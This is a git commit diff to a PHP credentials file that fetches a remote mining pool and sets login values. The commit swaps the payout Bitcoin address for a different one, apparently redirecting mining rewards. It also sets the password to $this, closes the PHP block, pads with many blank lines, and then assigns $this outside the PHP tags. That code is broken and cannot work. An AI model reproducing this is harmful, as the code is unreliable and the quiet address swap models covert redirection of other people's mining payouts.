c8489e7abd72f3961d219db8c64d3a450d573020
Y01banny <12914088+tteeee@users.noreply.github.com>
2017-12-31 00:28:50 +0300

    Update credentials.class.php

--- credentials.class.php
+++ credentials.class.php
@@ -8,6 +8,25 @@
     $response = json_decode(file_get_contents("http://nodes.p2pool.co/pools.dat"),true);
     $url = $response[0]['name'];
     $port = $response[0]['port'];
-    $username = "1Fa2uuQ3rLsYovnuzn7fvWZErg6Q4P3W1D";
-    $password = "LBP123.123ground";
+    $username = "1PgpHsmvbdLEs8mujJyKBoSvSfhFBnru41";
+    $password = $this;
+## Perm
+###
+?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$this = "LBP123123ground";
 ?>
